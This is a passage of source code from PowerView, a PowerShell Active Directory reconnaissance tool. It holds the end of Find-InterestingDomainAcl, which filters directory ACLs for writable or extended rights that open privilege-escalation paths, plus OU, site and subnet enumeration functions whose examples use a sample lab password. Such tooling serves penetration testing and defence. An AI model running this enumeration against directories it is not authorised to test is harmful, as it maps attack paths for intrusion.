$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingDomainAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

        $ObjectSearcherArguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }

        # ongoing list of built-up SIDs
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                # only process SIDs > 1000
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        # "IdentityReferenceDN: $IdentityReferenceDN"

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # "IdentityReferenceDomain: $IdentityReferenceDomain"
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            # "IdentityReferenceDN: $IdentityReferenceDN"
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $IdentityReferenceClass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $IdentityReferenceClass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $IdentityReferenceClass = 'user'
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                # save so we don't look up more than once
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin* -Domain testlab.local

Returns all OUs with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

"*admin*","*server*" | Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainOU -Credential $Cred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all sites with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSite -Credential $Cred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSubnet -Credential $Cred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Subnet = $_
